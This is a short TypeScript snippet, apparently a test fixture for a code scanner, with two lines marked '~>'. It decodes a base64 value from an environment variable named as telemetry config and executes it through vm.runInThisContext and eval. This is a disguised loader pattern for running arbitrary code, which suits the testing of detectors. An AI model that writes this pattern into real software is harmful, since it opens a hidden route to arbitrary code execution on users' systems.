import * as vm from "vm";

const encoded: string = process.env.TELEMETRY_CFG ?? "";

export function start(): void {
  const code = Buffer.from(encoded, "base64").toString();
~>  vm.runInThisContext(code);
  const second = atob(encoded);
~>  eval(second);
}
